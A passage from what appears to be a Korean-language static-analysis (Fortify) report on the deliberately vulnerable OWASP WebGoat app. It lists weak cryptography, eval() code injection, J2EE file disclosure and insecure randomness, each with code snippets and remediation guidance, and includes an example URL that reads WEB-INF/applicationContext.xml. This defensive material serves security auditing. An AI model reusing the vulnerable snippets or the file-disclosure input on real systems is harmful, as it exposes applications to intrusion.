			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );</Snippet>
<TargetFunction>PBEParameterSpec()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8B13739BB057E3CB77B3D988625266C9" ruleID="116373B0-38D5-4932-82BC-3F4BFB082B96">
                            <Category>Weak Cryptographic Hash: Hardcoded PBE Salt</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>하드코드된 솔트(hardcoded salt)는 쉽게 해결할 수 없는 방식으로 시스템 보안을 손상시킬 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>487</LineStart>
<Snippet>		{

			PBEParameterSpec ps = new javax.crypto.spec.PBEParameterSpec( salt, 20 );

			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );</Snippet>
<TargetFunction>PBEParameterSpec()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Weak Encryption: Insecure Mode of Operation</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Encoding.java의 decryptString() 함수는 491 줄에서 안전하지 않은 작업 모드로 암호화 알고리즘을 사용합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>블록 암호 작업 모드는 암호의 단일 블록 작업을 반복해서 적용하여 블록보다 많은 양의 데이터를 안전하게 변환하는 방법을 설명하는 알고리즘입니다. 일부 작업 모드에는 ECB(Electronic Codebook), CBC(Cipher Block Chaining), CFB(Cipher Feedback) 및 CTR(Counter)이 포함됩니다.

ECB 모드는 동일한 일반 텍스트 블록에 대해 같은 암호화 텍스트를 생성하므로 본질적으로 취약합니다. CBC 모드는 Padding Oracle 공격에 취약합니다. CTR 모드에는 이러한 취약점이 없으므로 이 모드를 선택하는 것이 더 적절합니다.

예제 1: 다음 코드에서는 AES 암호를 ECB 모드로 사용합니다.


...
SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS7Padding", "BC");
cipher.init(Cipher.ENCRYPT_MODE, key);
...
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>블록보다 많은 양의 데이터를 암호화할 때는 ECB 및 CBC 작업 모드를 사용하지 않도록 합니다. CBC 모드는 다소 비효율적이며 SSL과 함께 사용할 경우 심각한 위험을 유발합니다[1]. 대신 CCM(Counter with CBC-MAC) 모드를 사용하거나, 성능이 중요하게 고려되는 경우 가급적 GCM(Galois/Counter Mode) 모드를 사용하십시오.

예제 2: 다음 코드에서는 AES 암호를 GCM 모드로 사용합니다.


...
SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
Cipher cipher = Cipher.getInstance("AES/GCM/PKCS5Padding", "BC");
cipher.init(Cipher.ENCRYPT_MODE, key);
...


일반적으로 작동 모드는 RSA 보안에 최소한의 영향을 미칩니다. 그러나 ECB 또는 기타 작동 모드를 사용할 때 보안 암호화를 위해 SHA-2 해시를 사용하는 OAEP 패딩과 같은 보안 패딩을 사용하는 것이 중요합니다.

예제 3: 다음 코드에서는 OAEP 패딩이 있는 ECB를 사용하여 RSA 공개 키로 암호화를 수행합니다.

  public Cipher getRSACipher() {
    Cipher rsa = null;
    try {
      rsa = javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
    }
    catch (java.security.NoSuchAlgorithmException e) {
       handleMissingAlgorithm();
    }
    catch (javax.crypto.NoSuchPaddingException e) {
       handleMissingAlgorithm();
    }
    return rsa;
  }
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3743303A5389ECF1D80BF2FA920372B0" ruleID="BE418AF6-534F-4812-AE94-314B8EFBFAC7">
                            <Category>Weak Encryption: Insecure Mode of Operation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Encoding.java의 decryptString() 함수는 491 줄에서 안전하지 않은 작업 모드로 암호화 알고리즘을 사용합니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>491</LineStart>
<Snippet>			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );

			Cipher passwordDecryptCipher = Cipher.getInstance( "PBEWithMD5AndDES/CBC/PKCS5Padding" );

			char[] pass = pw.toCharArray();</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7925BEA09F38B12AAAF1E201C2146528" ruleID="BE418AF6-534F-4812-AE94-314B8EFBFAC7">
                            <Category>Weak Encryption: Insecure Mode of Operation</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Encoding.java의 encryptString() 함수는 535 줄에서 안전하지 않은 작업 모드로 암호화 알고리즘을 사용합니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>535</LineStart>
<Snippet>			SecretKeyFactory kf = SecretKeyFactory.getInstance( "PBEWithMD5AndDES" );

			Cipher passwordEncryptCipher = Cipher.getInstance( "PBEWithMD5AndDES/CBC/PKCS5Padding" );

			char[] pass = pw.toCharArray();</Snippet>
<TargetFunction>getInstance()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Dead Code: Expression is Always true</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Exec.java의 118 줄에 포함된 식은 항상 true가 됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>이 식은 항상 true가 됩니다. 프로그램을 보다 간단한 형태로 다시 작성할 수 있습니다. 주변의 코드는 디버깅 목적으로 존재하거나 프로그램 나머지 부분과 함께 유지 관리되지 않을 수도 있습니다. 또한 이 식은 메서드 앞부분에서 버그를 암시하기도 합니다.

예제 1: 다음 메서드는 secondCall을 true로 초기화한 후 설정하지 않습니다. (변수 firstCall은 실수로 두 번 사용되었습니다.)  그 결과, 식 firstCall || secondCall은 항상 true가 되기 때문에 setUpForCall()이 항상 호출됩니다.


public void setUpCalls() {
  boolean firstCall = true;
  boolean secondCall = true;

  if (fCall &lt; 0) {
    cancelFCall();
    firstCall = false;
  }
  if (sCall &lt; 0) {
    cancelSCall();
    firstCall = false;
  }

  if (firstCall || secondCall) {
    setUpForCall();
  }
}


예제 2: 다음 메서드는 firstCall 및 secondCall 변수를 확인하려고 시도합니다. (firstCall 변수는 확인되는 대신 실수로 true로 설정되어 있습니다.)  결과는 firstCall = true &amp;&amp; secondCall == true 식의 첫 부분이 항상 true가 되는 것입니다.


public void setUpCalls() {
  boolean firstCall = false;
  boolean secondCall = false;

  if (fCall &gt; 0) {
    setUpFCall();
    firstCall = true;
  }
  if (sCall &gt; 0) {
    setUpSCall();
    secondCall = true;
  }

  if (firstCall = true &amp;&amp; secondCall == true) {
    setUpDualCall();
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>일반적으로 사용하지 않는 코드는 수정하거나 삭제하는 것이 좋습니다. 프로그램의 기능에는 도움이 되지 않고 복잡하고 유지 관리 부담만 늘어납니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="35B1A24AE1C99BABD71707D91064696B" ruleID="0C82D0B5-1B23-4D56-B38E-F6263A454766">
                            <Category>Dead Code: Expression is Always true</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Exec.java의 118 줄에 포함된 식은 항상 true가 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>118</LineStart>
<Snippet>
	    // Write to the child process' input stream
	    if ((input != null) &amp;&amp; !input.equals(""))
	    {
		try</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Dynamic Code Evaluation: Code Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>menu_system.js 파일이 137 줄에서 확인되지 않은 사용자 입력을 소스 코드로 해석합니다. 런타임 시 사용자가 제어하는 명령어를 해석하면 공격자가 악성 코드를 실행할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>현대의 많은 프로그래밍 언어가 소스 명령어의 동적 해석을 허용합니다. 이 기능을 사용하여 프로그래머가 사용자에게서 받은 입력에 따라 동적 명령어를 수행할 수 있습니다. 프로그래머가 사용자로부터 직접 입력된 명령어가 활성 사용자 개체의 간단한 계산을 수행하거나 사용자의 상태를 수정하는 등의 무해한 작업만 수행한다고 잘못 가정하면 code injection 취약점이 발생합니다. 그러나, 적절한 검증 없이 프로그래머가 의도하지 않은 작업을 사용자가 지정할 수 있습니다.


예: 이 전형적인 code injection 예제에서 응용 프로그램은 사용자가 실행 명령을 지정할 수 있는 기본 계산기를 구현합니다.


...
	userOp = form.operation.value;
	calcResult = eval(userOp);
...


"8 + 7 * 2  "와 같이 operation 매개 변수가 양의 값일 때 프로그램이 올바르게 동작합니다. 이 경우 calcResult 변수에 22의 값이 할당됩니다. 그러나, 공격자가 올바르고 악의적인 언어 작업을 지정하면 해당 작업이 상위 프로세스의 전체 권한으로 실행됩니다. 이러한 공격은 기본 언어가 시스템 리소스에 대한 접근을 제공하거나 시스템 명령 실행을 허용할 때 더 위험합니다. JavaScript의 경우, 공격자는 이 취약점을 이용하여 cross-site scripting 공격을 수행할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>가급적이면 동적 코드 해석을 사용하지 마십시오. 프로그램의 기능에 동적으로 해석할 코드가 필요한 경우 가능한 한 동적으로 프로그램이 실행하도록 코드를 제한하여 공격 가능성이 최소화되고 기본 프로그래밍 언어의 응용 프로그램별 및 컨텍스트별 부분 집합으로 제한됩니다. 

동적 코드 실행이 필요할 때 확인되지 않은 사용자 입력이 응용 프로그램에서 직접 실행되거나 해석해서는 안 됩니다. 대신 다음과 같이 간접적인 방법을 사용합니다. 즉, 사용자가 지정할 수 있는 올바른 작업 및 데이터 개체 목록을 만들어 사용자가 목록에서 선택하는 것만 허용하는 것입니다. 이러한 방법으로 사용자가 제공한 입력 내용은 직접 실행되지 않습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B805D6EDA497542E8E1EF523A376630D" ruleID="A1172BFC-2902-4E59-A9C7-C80B132F30CD0">
                            <Category>Dynamic Code Evaluation: Code Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>menu_system.js 파일이 137 줄에서 확인되지 않은 사용자 입력을 소스 코드로 해석합니다. 런타임 시 사용자가 제어하는 명령어를 해석하면 공격자가 악성 코드를 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>menu_system.js</FileName>
<FilePath>WebContent/javascript/menu_system.js</FilePath>
<LineStart>137</LineStart>
<Snippet>  if(nv.length&gt;0){if(unescape(nv[0])==param){
  mn="menu"+unescape(nv[1]);
  eval("trigMenuMagic1('"+mn+"',"+opt+")");}}}}
  }
  </Snippet>
<TargetFunction>eval()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>menu_system.js</FileName>
<FilePath>WebContent/javascript/menu_system.js</FilePath>
<LineStart>132</LineStart>
<Snippet>function trigMM1url(param,opt){
  var ur,x,i,nv,mn,pr=new Array();
  ur=document.URL;x=ur.indexOf("?");
  if(x&gt;1){pr=ur.substring(x+1,ur.length).split("&amp;");
  for(i=0;i&lt;pr.length;i++){nv=pr[i].split("=");</Snippet>
<TargetFunction>Read document.URL()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>File Disclosure: J2EE</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Interceptor.java의 135 줄에서 doFilter() 메서드는 확인되지 않은 입력으로 만들어진 경로를 사용하여 서버 쪽 전달을 호출합니다. 이로 인해 공격자는 응용 프로그램 바이너리를 다운로드하거나 보호할 수 있는 디렉터리 내 임의의 파일을 볼 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>다음과 같은 경우 파일 공개가 발생합니다.
1. 신뢰할 수 없는 소스에서 데이터가 프로그램에 입력됩니다.


2. 데이터를 사용하여 경로를 동적으로 생성합니다. 



예제 1: 다음 코드는 신뢰할 수 없는 데이터를 취하고 이를 사용하여 서버 쪽 전달에 사용되는 경로를 빌드합니다.


...
String returnURL = request.getParameter("returnURL");
	RequestDispatcher rd = request.getRequestDispatcher(returnURL);
	rd.forward();
...


예제 2: 다음 코드는 신뢰할 수 없는 데이터를 취하고 이를 사용하여 서버 쪽 전달에 사용되는 경로를 빌드합니다.


...
	&lt;% String returnURL = request.getParameter("returnURL"); %&gt;
	&lt;jsp:include page="&lt;%=returnURL%&gt;" /&gt;
	...



공격자가 민감한 파일 위치와 일치하는 요청 매개 변수를 URL에 제공한 경우, 해당 파일을 볼 수 있습니다. 예를 들어 "http://www.yourcorp.com/webApp/logic?returnURL=WEB-INF/applicationContext.xml"에서 응용 프로그램의 applicationContext.xml을 볼 수 있습니다. 
공격자는 applicationContext.xml을 확보한 후 applicationContext.xml 또는 클래스나 jar 파일에서 참조된 다른 구성 파일을 찾아 다운로드할 수 있습니다. 그러면 공격자는 응용 프로그램에 대한 민감한 정보를 얻고 해당 정보를 대상으로 다른 유형의 공격을 할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>신뢰할 수 없는 데이터를 사용하여 서버 쪽 리소스에 대한 요청을 지시하지 마십시오. 대신 위치 및 경로 간 간접 참조를 사용하십시오.
다음은 사용하지 마십시오.

&lt; a href="http://www.yourcorp.com/webApp/logic?nextPage=WEB-INF/signup.jsp"&gt;New Customer&lt;/a&gt;

다음을 사용하십시오.

&lt; a href="http://www.yourcorp.com/webApp/logic?nextPage=newCustomer"&gt;New Customer&lt;/a&gt;

서버 쪽 로직에는 키 "newCustomer" 아래 저장된 경로가 "/WEB-INF/signup.jsp"인 서버 쪽 경로에 대해 로직 이름으로 입력된 맵이 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="37C1153AD13E5150BD4872F68F9751F9" ruleID="66399BDF-8E0A-485E-A615-07C96D2632F9">
                            <Category>File Disclosure: J2EE</Category>
                            <Folder>Medium</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Interceptor.java의 135 줄에서 doFilter() 메서드는 확인되지 않은 입력으로 만들어진 경로를 사용하여 서버 쪽 전달을 호출합니다. 이로 인해 공격자는 응용 프로그램 바이너리를 다운로드하거나 보호할 수 있는 디렉터리 내 임의의 파일을 볼 수 있습니다.</Abstract>
                            <Friority>Medium</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	String url = req.getRequestURL().toString();

	RequestDispatcher disp = req.getRequestDispatcher(url.substring(url
		.lastIndexOf("WebGoat/")
		+ "WebGoat".length()));</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getRequestDispatcher()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>133</LineStart>
<Snippet>	}

	String url = req.getRequestURL().toString();

	RequestDispatcher disp = req.getRequestDispatcher(url.substring(url</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getRequestURL()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Insecure Randomness</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>random()에서 구현되는 난수 발생기는 암호화 공격을 차단하지 못합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Insecure Randomness 오류는 보안이 중요한 상황에서 예측 가능한 값을 생성할 수 있는 함수를 난수 발생원으로 사용할 때 발생합니다.

컴퓨터는 결정론을 사용하는 시스템이기 때문에 진정한 무작위성을 구현할 수 없습니다. PRNG(의사 난수 발생기)는 시드로부터 이후의 값을 계산하는 알고리즘을 사용하여 무작위성에 최대한 접근합니다.

PRNG는 두 가지 종류가 있는데 통계적 PRNG 및 암호화 PRNG입니다. 통계적 PRNG는 유용한 통계적 속성을 제공하지만 출력을 쉽게 예측할 수 있고 재생하기 쉬운 숫자 스트림을 만들기 때문에 보안이 예측할 수 없는 값을 생성하는 방식에 의존하는 경우 사용하기 부적합합니다. 암호화 PRNG는 예측하기 어려운 출력을 생성하여 이 문제를 해결합니다. 암호화 값이 안전하려면 공격자가 생성된 무작위 값과 실제적인 무작위 값을 구분하는 것이 불가능하거나 아주 어려워야 합니다. 일반적으로 PRNG 알고리즘이 안전한 암호화로 알려져 있지 않은 경우에는 통계적 PRNG를 가리키는 것일 수 있는데, 이 PRNG는 보안이 중요한 상황일 때 사용해서는 안 됩니다. 이 경우 통계적 PRNG를 사용하면 추측하기 쉬운 임시 암호, 예측 가능한 암호화 키, 세션 하이재킹, DNS 스푸핑 등의 심각한 취약점을 유발할 수 있습니다.

예제: 다음 코드는 통계적 PRNG를 사용하여 구입 후 일정 기간 동안 활성 상태를 유지하는 영수증의 URL을 작성합니다.


String GenerateReceiptURL(String baseUrl) {
    Random ranGen = new Random();
    ranGen.setSeed((new Date()).getTime());
    return (baseUrl + ranGen.nextInt(400000000) + ".html");
}


이 코드는 Random.nextInt() 함수를 사용하여 생성되는 영수증 페이지에 대한 "고유한" ID를 생성합니다. Random.nextInt()은 통계적 PRNG이므로 생성되는 문자열을 공격자가 쉽게 추축할 수 있습니다. 영수증 시스템의 기본 설계에도 오류가 있지만 암호화 PRNG와 같이 예측 가능한 영수증 ID를 생성하지 않는 난수 발생기를 사용했다면 훨씬 안전했을 것입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>가장 보안이 민감한 사안에 무작위성을 적용하는 것처럼, 예측 불가능성이 필수적일 때 암호화 PRNG를 사용합니다. 선택한 PRNG에 관계없이 항상 알고리즘의 시드를 생성하기에 충분한 엔트로피가 있는 값을 사용합니다. (현재 시간과 같은 값은 미미한 엔트로피 수준만 제공하므로 사용하지 마십시오.)

Java 언어는 java.security.SecureRandom에 암호화 PRNG를 제공합니다. java.security의 다른 알고리즘 기반 클래스와 마찬가지로 SecureRandom도 특정 알고리즘 집합에 구현과 관계 없는 래퍼를 제공합니다. SecureRandom.getInstance()를 사용하여 SecureRandom 개체의 인스턴스를 요청함으로써 알고리즘의 특정 구현을 요청할 수 있습니다. 알고리즘을 사용할 수 있는 경우 알고리즘은 SecureRandom 개체로 제공됩니다. 알고리즘을 사용할 수 없거나 특정 구현을 지정하지 않은 경우, 시스템이 선택한 SecureRandom 구현이 제공됩니다. 

Sun은 SHA1PRNG라는 Java 배포판을 사용하여 단일 SecureRandom 구현을 제공하는데 그 계산 과정을 다음과 같이 설명합니다.

"매 연산마다 1씩 증가하는 64비트 카운터와 연결된 실제 무작위 시드 값에 대해 SHA-1 해시를 계산합니다. 160비트 SHA-1 출력부터 64비트만 사용됩니다[1]." 

하지만 Sun의 SHA1PRNG 알고리즘 구현에 대한 구체적인 내용은 상세하게 설명되어 있지 않고 구현에 사용한 엔트로피 소스가 불확실하며, 따라서 출력의 실제 무작위성이 어떤 수준인지도 불확실합니다. 웹 상에 Sun 구현에 대한 추측이 난무하지만 알고리즘의 암호화가 강력하고 보안에 민감한 상황에서 안전하게 사용할 수 있다는 주장을 반박할 만한 증거는 없습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="478C6A9953C6D2996ECAB34ED911B6A0" ruleID="57E7AB18-082F-4C18-8DE1-4115DB3917A3">
                            <Category>Insecure Randomness</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>random()에서 구현되는 난수 발생기는 암호화 공격을 차단하지 못합니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>77</LineStart>
<Snippet>    protected static List&lt;String&gt; sessionList = new ArrayList&lt;String&gt;();

    protected static long seq = Math.round(Math.random() * 10240) + 10000;

    protected static long lastTime = System.currentTimeMillis();</Snippet>
<TargetFunction>random()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Bad Practices: Sockets</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Interceptor.java의 doFilter() 메서드는 Socket()을(를) 호출합니다. 웹 응용 프로그램의 소켓 기반 통신은 오류가 발생할 가능성이 큽니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>J2EE 표준은 더 높은 수준의 프로토콜을 사용할 수 없을 때 레거시 시스템과의 통신을 위해서만 Use of Sockets를 허용합니다. 자체적으로 통신 프로토콜을 제작하려면 다음과 같은 어려운 보안 문제와 씨름해야 합니다. 

- 대역 내 및 대역 외 시그널(signal) 처리

- 프로토콜 버전 간 호환성

- 채널 보안

- 오류 처리

- 네트워크 제약 조건(방화벽)

- 세션 관리

사용자 지정 통신 프로토콜은 보안 전문가의 정밀 검사 없이는 보안 문제가 발생할 가능성이 큽니다.

표준 프로토콜의 사용자 지정 구현도 마찬가지로 수많은 동일한 이슈가 적용됩니다. 일반적으로 표준 프로토콜 구현 관련 보안 문제를 다루는 데 사용 가능한 리소스가 많지만 이들 리소스는 공격자도 사용할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>사용자 지정 통신 프로토콜을 산업 표준 프로토콜 또는 프레임워크로 교체하는 것이 좋습니다. HTTP, FTP, SMTP, CORBA, RMI/IIOP, EJB 또는 SOAP 등의 프로토콜 사용을 고려해 보십시오.

선택한 프로토콜 구현의 보안 추적 기록을 고려해 봅니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. J2EE가 아닌 Java 응용 프로그램을 감사하는 경우 J2EE의 부적절한 사례 범주가 사용자 환경에 적용되지 않을 수 있습니다. 이런 경우 Audit Guide를 사용하여 이러한 문제를 억제할 수 있습니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="45A23F71D11BF7CC82AD74A1C9CD62B5" ruleID="73B5DD01-BFBE-4CD5-8759-C432873136FB">
                            <Category>J2EE Bad Practices: Sockets</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>Interceptor.java의 doFilter() 메서드는 Socket()을(를) 호출합니다. 웹 응용 프로그램의 소켓 기반 통신은 오류가 발생할 가능성이 큽니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>93</LineStart>
<Snippet>		    &amp;&amp; osgServerPort != null &amp;&amp; osgServerPort.length() != 0)
	    {
		osgSocket = new Socket(osgServerName, Integer
			.parseInt(osgServerPort));
		if (osgSocket != null)</Snippet>
<TargetFunction>Socket()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Excessive Servlet Mappings</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
